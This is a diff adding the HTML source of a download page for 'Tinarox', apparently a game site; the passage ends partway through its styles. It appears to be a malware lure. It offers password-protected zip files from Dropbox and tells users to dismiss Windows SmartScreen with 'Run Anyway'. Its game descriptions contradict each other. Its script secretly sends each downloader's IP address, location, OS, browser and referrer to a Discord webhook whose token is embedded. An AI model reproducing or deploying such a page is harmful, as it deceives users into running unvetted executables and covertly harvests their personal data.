@@ -1,0 +1,1056 @@
+<!DOCTYPE html><html><head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>Tinarox - Home</title>
+    <meta property="og:image" content="Sem_Titulo-448d638d63.html">
+    <meta name="description" content="Tinarox is a Metroidvania focused on fast-paced combat, exploration, and an engaging story. It features a brand new protagonist and a large interconnected world. The Queen of Light must stop the destruction of existence by challenging the Supreme God Chaos while seeking the location of their nemesis.
+">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
+
+    <!-- Add Poppins font from Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="css/plugins.css">
+    <link rel="stylesheet" href="css/main.css">
+
+    <script src="js/tg-page-head.js"></script>
+
+    <meta property="og:title" content="Tinarox">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="">
+    <meta property="og:description" content="Tinarox is a Metroidvania focused on fast-paced combat, exploration, and an engaging story. It features a brand new protagonist and a large interconnected world. The Queen of Light must stop the destruction of existence by challenging the Supreme God Chaos while seeking the location of their nemesis.
+">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="Tinarox">
+    <meta name="twitter:title" content="Tinarox">
+    <meta name="twitter:type" content="website">
+    <meta name="twitter:image" content="assets/img/twitter-image.png">
+    <meta name="twitter:description" content="Tinarox is a Metroidvania focused on fast-paced combat, exploration, and an engaging story. It features a brand new protagonist and a large interconnected world. The Queen of Light must stop the destruction of existence by challenging the Supreme God Chaos while seeking the location of their nemesis.
+">
+    <meta property="fb:page_id" content="794950460550057">
+    <meta name="description" content="Tinarox™  is a 2D stealth-action game about an evil shapeshifter on the run from justice. Survive a world forged through Medieval history with merciless pursuers, daring escapes, and an ancient mystery driving your every move.">
+    <meta name="keywords" content="Tinarox Game">
+    <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'UA-223921009-3');
+    </script>
+
+    <!-- Define copyPassword() in the head to ensure it's available -->
+    <script>
+        function copyPassword() {
+            console.log("TV2025 clicked! Attempting to copy...");
+            try {
+                navigator.clipboard.writeText("TV2025").then(() => {
+                    console.log("Successfully copied TV2025 to clipboard");
+                    const copiedMessage = document.querySelector(".copied-message");
+                    if (copiedMessage) {
+                        copiedMessage.style.display = "block";
+                        copiedMessage.style.opacity = "1";
+                        setTimeout(() => {
+                            copiedMessage.style.opacity = "0";
+                            setTimeout(() => {
+                                copiedMessage.style.display = "none";
+                            }, 300);
+                        }, 1500);
+                    }
+                }).catch(err => {
+                    console.error("Failed to copy: ", err);
+                    alert("Failed to copy password. Please copy manually: TV2025");
+                });
+            } catch (err) {
+                console.error("Clipboard API not supported: ", err);
+                alert("Clipboard API not supported. Please copy manually: TV2025");
+            }
+        }
+
+        // New popup functions
+        function showDownloadPopup() {
+            const popup = document.getElementById('downloadPopup');
+            const overlay = document.getElementById('popupOverlay');
+            overlay.style.display = 'flex';
+            setTimeout(() => {
+                overlay.classList.add('show');
+                popup.classList.add('show');
+            }, 10);
+        }
+
+        function closePopup() {
+            const popup = document.getElementById('downloadPopup');
+            const overlay = document.getElementById('popupOverlay');
+            popup.classList.remove('show');
+            overlay.classList.remove('show');
+            setTimeout(() => {
+                overlay.style.display = 'none';
+                // Reset form after popup is completely hidden
+                resetPopupToInitialState();
+            }, 300);
+        }
+
+        function resetPopupToInitialState() {
+            setTimeout(() => {
+                const inviteStep = document.getElementById('inviteStep');
+                const downloadStep = document.getElementById('downloadStep');
+                const thankYouStep = document.getElementById('thankYouStep');
+                
+                // Clear input
+                document.getElementById('inviteInput').value = '';
+                
+                // Reset all steps to initial state
+                inviteStep.style.display = 'block';
+                inviteStep.style.opacity = '1';
+                inviteStep.style.transform = 'translateX(0)';
+                
+                downloadStep.style.display = 'none';
+                downloadStep.style.opacity = '1';
+                downloadStep.style.transform = 'translateX(0)';
+                
+                thankYouStep.style.display = 'none';
+                thankYouStep.style.opacity = '1';
+                thankYouStep.style.transform = 'scale(1)';
+                
+                // Reset download buttons to original state
+                resetDownloadButtons();
+            }, 50);
+        }
+
+        function resetDownloadButtons() {
+            const newVersionBtn = document.getElementById('newVersionBtn');
+            const oldVersionBtn = document.getElementById('oldVersionBtn');
+            
+            // Reset new version button
+            newVersionBtn.disabled = false;
+            newVersionBtn.style.opacity = '1';
+            newVersionBtn.innerHTML = '🆕 Download New Version';
+            
+            // Reset old version button
+            oldVersionBtn.disabled = false;
+            oldVersionBtn.style.opacity = '1';
+            oldVersionBtn.innerHTML = '📦 Download Old Version';
+        }
+
+        function proceedToDownload() {
+            const inviteCode = document.getElementById('inviteInput').value.trim();
+            if (!inviteCode) {
+                alert('Please enter who invited you!');
+                return;
+            }
+            
+            // Store invite code for later use
+            window.currentInviteCode = inviteCode;
+            
+            // Animate transition from invite step to download step
+            const inviteStep = document.getElementById('inviteStep');
+            const downloadStep = document.getElementById('downloadStep');
+            
+            // Fade out invite step
+            inviteStep.style.opacity = '0';
+            inviteStep.style.transform = 'translateX(-20px)';
+            
+            setTimeout(() => {
+                inviteStep.style.display = 'none';
+                downloadStep.style.display = 'block';
+                downloadStep.style.opacity = '0';
+                downloadStep.style.transform = 'translateX(20px)';
+                
+                // Fade in download step
+                setTimeout(() => {
+                    downloadStep.style.opacity = '1';
+                    downloadStep.style.transform = 'translateX(0)';
+                }, 50);
+            }, 300);
+        }
+
+        function downloadVersion(version, downloadUrl, buttonElement) {
+            const inviteCode = window.currentInviteCode || 'Unknown';
+            
+            // Disable all buttons and show loading on clicked one
+            const newVersionBtn = document.getElementById('newVersionBtn');
+            const oldVersionBtn = document.getElementById('oldVersionBtn');
+            
+            newVersionBtn.disabled = true;
+            oldVersionBtn.disabled = true;
+            
+            // Show loading on clicked button
+            buttonElement.innerHTML = '<span class="loading-spinner"></span> Downloading...';
+            buttonElement.style.opacity = '0.8';
+            
+            // Simulate download preparation time
+            setTimeout(() => {
+                // Start actual download
+                const link = document.createElement('a');
+                link.href = downloadUrl;
+                link.download = '';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+
+                // Send webhook data
+                sendDownloadWebhook(version, inviteCode);
+                
+                // Show thank you message with confetti
+                showThankYouMessage();
+            }, 2000); // 2 second loading time
+        }
+
+        function sendDownloadWebhook(version, inviteCode) {
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const country = data.country_name || 'Unknown';
+                    const countryCode = (data.country_code || '').toUpperCase();
+                    const os = getOperatingSystem();
+                    const browser = navigator.userAgent.match(/(Firefox|Chrome|Safari|Edge)\/[\d.]+/)?.[0] || 'Unknown';
+
+                    // Country flag emoji
+                    let flag = '';
+                    for (let c of countryCode) {
+                        flag += String.fromCodePoint(127397 + c.charCodeAt());
+                    }
+
+                    // Webhook payload with invite code
+                    const payload = {
+                        embeds: [{
+                            title: "🎉 Dosya İndirildi!",
+                            color: version === 'new' ? 0x4A90E2 : 0xE24A90,
+                            author: {
+                                name: "Tinarox Downloader",
+                            },
+                            fields: [
+                                { name: "📥 IP Adresi", value: ip, inline: true },
+                                { name: "🌍 Konum", value: `${country} ${flag}`, inline: true },
+                                { name: "💻 İşletim Sistemi", value: os, inline: true },
+                                { name: "🌐 Tarayıcı", value: browser, inline: true },
+                                { name: "📦 Versiyon", value: version === 'new' ? 'Yeni Versiyon' : 'Eski Versiyon', inline: true },
+                                { name: "👤 Davet Eden", value: inviteCode, inline: true }
+                            ],
+                            footer: {
+                                text: "Tinarox | İndirme Bilgisi",
+                            },
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+
+                    fetch("https://canary.discord.com/api/webhooks/1403467876983111780/Z5z4WvyQ68JdIMb-wJ9xIV9d666KW0H6ybIoe6vtaXvOSUwZVmn6slUSXwmL3YhSlZax", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
+                    });
+                })
+                .catch(err => console.error("Veri alınamadı:", err));
+        }
+
+        function showThankYouMessage() {
+            const downloadStep = document.getElementById('downloadStep');
+            const thankYouStep = document.getElementById('thankYouStep');
+            
+            // Animate transition from download step to thank you step
+            downloadStep.style.opacity = '0';
+            downloadStep.style.transform = 'translateY(-20px)';
+            
+            setTimeout(() => {
+                downloadStep.style.display = 'none';
+                thankYouStep.style.display = 'block';
+                thankYouStep.style.opacity = '0';
+                thankYouStep.style.transform = 'scale(0.8)';
+                
+                // Fade in thank you step with scale animation
+                setTimeout(() => {
+                    thankYouStep.style.opacity = '1';
+                    thankYouStep.style.transform = 'scale(1)';
+                    
+                    // Trigger confetti after animation completes
+                    setTimeout(() => {
+                        createConfetti();
+                    }, 200);
+                }, 50);
+            }, 300);
+            
+            // Auto close after 4 seconds (increased to enjoy confetti)
+            setTimeout(() => {
+                closePopup();
+            }, 4000);
+        }
+
+        // Confetti Animation Function
+        function createConfetti() {
+            const confettiContainer = document.createElement('div');
+            confettiContainer.className = 'confetti-container';
+            document.body.appendChild(confettiContainer);
+
+            const colors = ['#f5a623', '#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#feca57'];
+            const confettiCount = 50;
+
+            for (let i = 0; i < confettiCount; i++) {
+                createConfettiPiece(confettiContainer, colors[Math.floor(Math.random() * colors.length)]);
+            }
+
+            // Remove confetti after animation
+            setTimeout(() => {
+                if (confettiContainer.parentNode) {
+                    confettiContainer.parentNode.removeChild(confettiContainer);
+                }
+            }, 3000);
+        }
+
+        function createConfettiPiece(container, color) {
+            const confetti = document.createElement('div');
+            confetti.className = 'confetti-piece';
+            confetti.style.backgroundColor = color;
+            confetti.style.left = Math.random() * 100 + '%';
+            confetti.style.animationDelay = Math.random() * 2 + 's';
+            confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
+            container.appendChild(confetti);
+        }
+
+        function getOperatingSystem() {
+            const ua = navigator.userAgent;
+            if (/Win/.test(ua)) return "Windows";
+            if (/Mac/.test(ua)) return "Mac OS";
+            if (/Android/.test(ua)) return "Android";
+            if (/iPhone|iPad/.test(ua)) return "iOS";
+            if (/Linux/.test(ua)) return "Linux";
+            return "Bilinmiyor";
+        }
+
+        // Handle Enter key in invite input
+        document.addEventListener('DOMContentLoaded', function() {
+            const inviteInput = document.getElementById('inviteInput');
+            if (inviteInput) {
+                inviteInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        proceedToDownload();
+                    }
+                });
+            }
+        });
+    </script>
+</head>
+
+<body>
+    <!-- Download Popup Overlay -->
+    <div id="popupOverlay" class="popup-overlay">
+        <div id="downloadPopup" class="download-popup">
+            <!-- Step 1: Invite Code -->
+            <div id="inviteStep" class="popup-step">
+                <div class="popup-header">
+                    <h3>🎮 Welcome to Tinarox!</h3>
+                    <button class="close-btn" onclick="closePopup()">×</button>
+                </div>
+                <div class="popup-content">
+                    <p>Who invited you to download Tinarox?</p>
+                    <input type="text" id="inviteInput" placeholder="Enter the name of who invited you..." />
+                    <button class="popup-btn primary" onclick="proceedToDownload()">Continue</button>
+                </div>
+            </div>
+
+            <!-- Step 2: Download Options -->
+            <div id="downloadStep" class="popup-step" style="display: none;">
+                <div class="popup-header">
+                    <h3>📦 Choose Your Version</h3>
+                    <button class="close-btn" onclick="closePopup()">×</button>
+                </div>
+                <div class="popup-content">
+                    <p>Select which version you'd like to download:</p>
+                    <div class="download-options">
+                        <button id="newVersionBtn" class="popup-btn primary" onclick="downloadVersion('new', 'https://www.dropbox.com/scl/fi/8u1392z8v6rs4t5n1b7oo/Tinarox-Setup-1.0.0.zip?rlkey=n2szvzv315ffqotk6i7ni2lrp&st=ubta5czf&dl=1', this)">
+                            🟩 Download New Version
+                        </button>
+                        <button id="oldVersionBtn" class="popup-btn secondary" onclick="downloadVersion('old', 'https://www.dropbox.com/scl/fi/kiw8uoe7hha59nd92emnq/Tinarox_1.0.9.zip?rlkey=w4yqtuiz3b75bjph9t6wc1r02&st=xw1rdebd&dl=1', this)">
+                            🟨 Download Old Version
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step 3: Thank You -->
+            <div id="thankYouStep" class="popup-step" style="display: none;">
+                <div class="popup-content thank-you">
+                    <div class="thank-you-icon">🎉</div>
+                    <h3>Thank You!</h3>
+                    <p>Your download has started successfully.</p>
+                    <p>Enjoy playing Tinarox!</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <main class="main--area">
+        <section class="slider__area slider__bg" data-background="assets/img/slider/slider_bg.html">
+            <div class="slider-activee">
+                <div class="single-slider">
+                    <div class="container custom-container">
+                        <div class="row justify-content-between">
+                            <div class="col-lg-6">
+                                <div class="slider__content">
+                                    <h6 class="sub-title wow fadeInUp" data-wow-delay=".2s">Welcome to</h6>
+                                    <h2 class="title wow fadeInUp" data-wow-delay=".5s">
+                                        Tinarox
+                                    </h2>
+                                    <p class="fadeInUp" data-wow-delay=".8s">
+                                        Tinarox is a Metroidvania focused on fast-paced combat, exploration, and an engaging story. It features a brand new protagonist and a large interconnected world. The Queen of Light must stop the destruction of existence by challenging the Supreme God Chaos while seeking the location of their nemesis.
+                                    </p>
+                                    <div class="slider__btn wow fadeInUp" data-wow-delay="1.2s">
+                                        <a href="#" class="tg-btn-1" onclick="event.preventDefault(); showDownloadPopup();">
+                                            <span>Download</span>
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-xxl-6 col-xl-5 col-lg-6">
+                                <div class="slider__img text-center d-none d-lg-block">
+                                    <img src="images/octopus.png" data-magnetic="" alt="img" style="left: 10rem; top: 5rem; position: absolute; opacity: 10%;">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="octopus-item__area">
+            <div class="container custom-container">
+                <div class="row justify-content-center">
+                    <div class="col-xxl-4 col-xl-5 col-lg-6 col-md-9">
+                        <div class="octopus-item__box">
+                            <div class="octopus-item__content">
+                                <h4 class="title">
+                                    <a href="#">Metroidvania first and foremost</a>
+                                    <p style="font-size: 14px;">You'll explore new areas interconnected in a large world map full of secrets, secondary quests, and evils to defeat. As the Queen of Light, you must uncover the mysteries of a land never seen before in the franchise and gather allies to stop the imminent collapse of space and time. The variety of settings is enormous, as is an artistic direction that gives each area a unique personality.</p>
+                                </h4>
+                                <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2710920/14f43c71c313fc25429c2c9e779eb7889889c1da/ss_14f43c71c313fc25429c2c9e779eb7889889c1da.600x338.jpg?t=1749474161" alt="img" style="border-radius: 12px;">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-xxl-4 col-xl-5 col-lg-6 col-md-9">
+                        <div class="octopus-item__box">
+                            <div class="octopus-item__content">
+                                <h4 class="title">
+                                    <a href="#">Fast-paced gameplay</a>
+                                    <p style="font-size: 14px;">Every Metroidvania focused on combat and exploration needs a fast-paced combat system and tons of passive and offensive skills... Guess what, both requirements are featured in Tinarox. The formula already implemented in its predecessor is now fully upgraded including much more polished combat controls, brand-new abilities, and exclusive weapons for the Queen of Light.</p>
+                                </h4>
+                                <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2710920/0e1dedf434ae1325e17d3919734af2119d360552/ss_0e1dedf434ae1325e17d3919734af2119d360552.600x338.jpg?t=1749474161" alt="img" style="border-radius: 12px;">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-xxl-4 col-xl-5 col-lg-6 col-md-9">
+                        <div class="octopus-item__box">
+                            <div class="octopus-item__content">
+                                <h4 class="title">
+                                    <a href="#">Level design and progress</a>
+                                    <p style="font-size: 14px;">The game features an intuitive level design for the players to enjoy precise movement controls and complete liberty to explore and discover alternative routes. This is a Metroidvania, remember? As you become more skilled and the Queen of Light gets new abilities, Tinarox allows players to exploit the full potential of their character in confrontations against final bosses that promise a visual, sound, and playable spectacle.</p>
+                                </h4>
+                                <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2710920/66f7b762674876b2225de150ac81c87e18371240/ss_66f7b762674876b2225de150ac81c87e18371240.600x338.jpg?t=1749474161" alt="img" style="border-radius: 12px;">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <div class="area-background" data-background="assets/img/bg/area_bg01.html">
+            <section class="gallery__area fix section-pb-130 pt-50">
+                <div class="row justify-content-center">
+                    <div class="col-xl-6 col-lg-7 col-md-10">
+                        <div class="section__title text-center mb-60">
+                            <h3 class="title">Gallery</h3>
+                        </div>
+                    </div>
+                </div>
+                <div class="gallery__slider">
+                    <div class="container">
+                        <div class="row justify-content-center">
+                            <div class="col-xl-9 col-lg-10 col-md-11">
+                                <div class="swiper-container gallery-active">
+                                    <div class="swiper-wrapper">
+                                        <div class="swiper-slide">
+                                            <div class="gallery__item">
+                                                <div class="gallery__thumb">
+                                                    <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2710920/a65c38635b78f94cd8a425e6f14560d5311bb906/ss_a65c38635b78f94cd8a425e6f14560d5311bb906.600x338.jpg?t=1749474161" alt="img">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="swiper-slide">
+                                            <div class="gallery__item">
+                                                <div class="gallery__thumb">
+                                                    <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2710920/9c849f5631f68aab7d016f87d2bd3a1be95b84b9/ss_9c849f5631f68aab7d016f87d2bd3a1be95b84b9.600x338.jpg?t=1749474161" alt="img">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="swiper-slide">
+                                            <div class="gallery__item">
+                                                <div class="gallery__thumb">
+                                                    <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2710920/01261a80ac43b505d6604ef0e8723c4cca08878f/ss_01261a80ac43b505d6604ef0e8723c4cca08878f.600x338.jpg?t=1749474161" alt="img">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="swiper-slide">
+                                            <div class="gallery__item">
+                                                <div class="gallery__thumb">
+                                                    <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2710920/5d8dd194544943f8e0f9f6604e5ac5cab970bdbb/ss_5d8dd194544943f8e0f9f6604e5ac5cab970bdbb.600x338.jpg?t=1749474161" alt="img">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="swiper-slide">
+                                            <div class="gallery__item">
+                                                <div class="gallery__thumb">
+                                                    <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2710920/d94efd63b2864467ffe6a7437657ca7b14a1f965/ss_d94efd63b2864467ffe6a7437657ca7b14a1f965.600x338.jpg?t=1749474161" alt="img">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="swiper-slide">
+                                            <div class="gallery__item">
+                                                <div class="gallery__thumb">
+                                                    <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2710920/cb4b488870fbbed93c5effb18456bed045025ea2/ss_cb4b488870fbbed93c5effb18456bed045025ea2.600x338.jpg?t=1749474161" alt="img">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="swiper-slide">
+                                            <div class="gallery__item">
+                                                <div class="gallery__thumb">
+                                                    <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/2710920/11f0165dfe329d8a38fd39eb780cf397e9243022/ss_11f0165dfe329d8a38fd39eb780cf397e9243022.600x338.jpg?t=1749474161" alt="img">
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="swiper-scrollbar"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+
+        <!-- FAQ Section -->
+        <section class="faq__area">
+            <div class="container custom-container">
+                <div class="row justify-content-center">
+                    <div class="col-xl-10 col-lg-12 col-md-12">
+                        <div class="section__title text-center mb-60">
+                            <h3 class="title">Frequently Asked Questions</h3>
+                        </div>
+                        <div class="faq__box" style="background: linear-gradient(145deg, #1A1A1A, #2A2A2A); padding: 30px; border-radius: 15px; box-shadow: 0 6px 20px rgba(0, 0, 0, 0.8); border: 3px solid #f5a623; font-family: 'Poppins', sans-serif;">
+                            <div class="faq__item">
+                                <div class="faq__question" onclick="toggleAnswer(this)" style="cursor: pointer; padding: 15px; background: #2A2A2A; border-radius: 8px; margin-bottom: 10px; transition: background 0.3s ease;">
+                                    <h4 style="font-size: 18px; font-weight: 600; color: #f5a623; margin: 0; display: flex; justify-content: space-between; align-items: center;">
+                                        I'm getting a Windows SmartScreen warning, is this file safe?
+                                        <span class="faq__toggle" style="font-size: 20px; color: #f5a623;">+</span>
+                                    </h4>
+                                </div>
+                                <div class="faq__answer" style="display: none; padding: 15px; background: #333; border-radius: 8px; margin-bottom: 10px;">
+                                    <p style="font-size: 16px; line-height: 1.8; color: #E0E0E0; margin: 0;">
+                                        This is a default security feature that pops up when a file isn't digitally signed or comes from an unrecognized source. I can assure you this file is completely safe. You can click "More Info" and "Run Anyway".
+                                    </p>
+                                    <img src="images/smartscreen.png" alt="SmartScreen Warning" style="max-width: 100%; height: auto; border-radius: 8px; margin-top: 15px;">
+                                </div>
+                            </div>
+                            <div class="faq__item">
+                                <div class="faq__question" onclick="toggleAnswer(this)" style="cursor: pointer; padding: 15px; background: #2A2A2A; border-radius: 8px; margin-bottom: 10px; transition: background 0.3s ease;">
+                                    <h4 style="font-size: 18px; font-weight: 600; color: #f5a623; margin: 0; display: flex; justify-content: space-between; align-items: center;">
+                                        What are the system requirements?
+                                        <span class="faq__toggle" style="font-size: 20px; color: #f5a623;">+</span>
+                                    </h4>
+                                </div>
+                                <div class="faq__answer" style="display: none; padding: 15px; background: #333; border-radius: 8px; margin-bottom: 10px;">
+                                    <p style="font-size: 16px; line-height: 1.8; color: #E0E0E0; margin: 0;">
+                                        Tinarox can run on low-end PCs. Minimum requirements: Windows 10, Intel i3 or equivalent processor, 4 GB RAM, integrated graphics, 1 GB free storage space.
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="faq__item">
+                                <div class="faq__question" onclick="toggleAnswer(this)" style="cursor: pointer; padding: 15px; background: #2A2A2A; border-radius: 8px; margin-bottom: 10px; transition: background 0.3s ease;">
+                                    <h4 style="font-size: 18px; font-weight: 600; color: #f5a623; margin: 0; display: flex; justify-content: space-between; align-items: center;">
+                                        Which platforms can I play the game on?
+                                        <span class="faq__toggle" style="font-size: 20px; color: #f5a623;">+</span>
+                                    </h4>
+                                </div>
+                                <div class="faq__answer" style="display: none; padding: 15px; background: #333; border-radius: 8px; margin-bottom: 10px;">
+                                    <p style="font-size: 16px; line-height: 1.8; color: #E0E0E0; margin: 0;">
+                                        Currently, Tinarox is only available for Windows PCs. We're working on Mac and Linux support, but no release date has been set yet.
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="faq__item">
+                                <div class="faq__question" onclick="toggleAnswer(this)" style="cursor: pointer; padding: 15px; background: #2A2A2A; border-radius: 8px; margin-bottom: 10px; transition: background 0.3s ease;">
+                                    <h4 style="font-size: 18px; font-weight: 600; color: #f5a623; margin: 0; display: flex; justify-content: space-between; align-items: center;">
+                                        Will the game receive updates?
+                                        <span class="faq__toggle" style="font-size: 20px; color: #f5a623;">+</span>
+                                    </h4>
+                                </div>
+                                <div class="faq__answer" style="display: none; padding: 15px; background: #333; border-radius: 8px; margin-bottom: 10px;">
+                                    <p style="font-size: 16px; line-height: 1.8; color: #E0E0E0; margin: 0;">
+                                        Yes! Tinarox will receive regular updates with new levels, characters, and features. Stay tuned!
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="faq__item">
+                                <div class="faq__question" onclick="toggleAnswer(this)" style="cursor: pointer; padding: 15px; background: #2A2A2A; border-radius: 8px; margin-bottom: 10px; transition: background 0.3s ease;">
+                                    <h4 style="font-size: 18px; font-weight: 600; color: #f5a623; margin: 0; display: flex; justify-content: space-between; align-items: center;">
+                                        How can I contact support if I encounter issues?
+                                        <span class="faq__toggle" style="font-size: 20px; color: #f5a623;">+</span>
+                                    </h4>
+                                </div>
+                                <div class="faq__answer" style="display: none; padding: 15px; background: #333; border-radius: 8px; margin-bottom: 10px;">
+                                    <p style="font-size: 16px; line-height: 1.8; color: #E0E0E0; margin: 0;">
+                                        You can reach out to our support team via email at support@Tinarox.com We're here to help with any issues you might face!
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="faq__item">
+                                <div class="faq__question" onclick="toggleAnswer(this)" style="cursor: pointer; padding: 15px; background: #2A2A2A; border-radius: 8px; margin-bottom: 10px; transition: background 0.3s ease;">
+                                    <h4 style="font-size: 18px; font-weight: 600; color: #f5a623; margin: 0; display: flex; justify-content: space-between; align-items: center;">
+                                        Is there a multiplayer mode in Tinarox?
+                                        <span class="faq__toggle" style="font-size: 20px; color: #f5a623;">+</span>
+                                    </h4>
+                                </div>
+                                <div class="faq__answer" style="display: none; padding: 15px; background: #333; border-radius: 8px; margin-bottom: 10px;">
+                                    <p style="font-size: 16px; line-height: 1.8; color: #E0E0E0; margin: 0;">
+                                        Yes, Tinarox supports co-op multiplayer mode. You can play with your friends! :)
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="video__area video-bg tg-jarallax" data-background="assets/img/gallery/gallery01.html">
+            <div class="container">
+                <div class="row justify-content-center">
+                    <div class="col-xl-6 col-lg-8 col-md-11">
+                        <div class="video__content text-center">
+                            <div style="position:relative; width:100%; height:0px; padding-bottom:56.206%">
+                                <iframe allow="fullscreen" allowfullscreen="" height="100%" src="https://streamable.com/e/n9rc8j?" width="100%" style="border:none; width:100%; height:100%; position:absolute; left:0px; top:0px; overflow:hidden;"></iframe>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer-style-one">
+        <div class="copyright__wrap">
+            <div class="container">
+                <div class="row align-items-center">
+                    <div class="col-md-7">
+                        <div class="copyright__text">
+                            <p>Copyright © 2025 - All Rights Reserved By <span>THARON, Studios.</span></p>
+                        </div>
+                    </div>
+                    <div class="col-md-5">
+                        <div class="copyright__card text-center text-md-end">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+<!-- Install Instructions Box -->
+<div class="install-box" style="position: absolute; right: 20px; top: 20px; background: linear-gradient(145deg, #1A1A1A, #2A2A2A); color: #E0E0E0; padding: 25px; border-radius: 15px; width: 380px; box-shadow: 0 6px 20px rgba(0, 0, 0, 0.8); border: 3px solid #f5a623; font-family: 'Poppins', sans-serif; transition: transform 0.3s ease; z-index: 1000;">
+    <h3 style="font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 3px; color: #f5a623; border-bottom: 3px solid #f5a623; padding-bottom: 10px; background: #2A2A2A; border-radius: 10px; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);">How to Install Tinarox</h3>
+    <p style="font-size: 13px; text-align: center; margin-bottom: 15px; color: #B0B0B0;">How to setup <i>Tinarox</i> in just a few steps! 🚀</p>
+    <ol style="line-height: 1.6; padding-left: 20px; font-size: 14px; color: #E0E0E0;">
+        <li style="margin-bottom: 15px;">
+            <strong>Download and Extract the Game Files</strong><br>
+            Download the game file and extract the game file. You'll see files like <code>Tinarox.exe</code> and <code>UnityPlayer.dll</code>.
+        </li>
+        <li style="margin-bottom: 15px;">
+            <strong>Enter the Password (If Prompted)</strong><br>
+            If .zip file asks for a password, use: <span class="copy-text" onclick="copyPassword()" style="cursor: pointer; font-weight: bold; color: #f5a623; background-color: #333; padding: 4px 10px; border-radius: 5px; border: 1px solid #f5a623; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3); position: relative;">TV2025<span class="copied-message" style="display: none; position: absolute; top: -30px; left: 50%; transform: translateX(-50%); background: #f5a623; color: #1A1A1A; padding: 5px 10px; border-radius: 5px; font-size: 12px; opacity: 0; transition: opacity 0.3s ease;">Copied!</span></span>
+        </li>
+        <li style="margin-bottom: 15px;">
+            <strong>Launch and Enjoy!</strong><br>
+            Run <code>Tinarox.exe</code> to start. Ensure files like <code>UnityPlayer.dll</code> are all in the same folder. If you have issues, reach out. 😊 Enjoy!
+        </li>
+    </ol>
+</div>
+
+    <!-- Styles for Install Box, FAQ Section, and Popup -->
+    <style>
+        /* Popup Styles */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .popup-overlay.show {
+            opacity: 1;
+        }
+
+        .download-popup {
+            background: linear-gradient(145deg, #1A1A1A, #2A2A2A);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.9);
+            border: 3px solid #f5a623;
+            width: 90%;
+            max-width: 500px;
+            font-family: 'Poppins', sans-serif;
+            transform: scale(0.7);
+            transition: transform 0.3s ease;
+            overflow: hidden;
+        }
+
+        .download-popup.show {
+            transform: scale(1);
+        }
+
+        .popup-step {
+            transition: all 0.3s ease;
+        }
+
+        .popup-header {
+            background: #2A2A2A;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #f5a623;
+        }
+
+        .popup-header h3 {
+            margin: 0;
+            color: #f5a623;
+            font-size: 22px;
+            font-weight: 600;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            color: #f5a623;
+            font-size: 30px;
+            cursor: pointer;
+            padding: 0;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
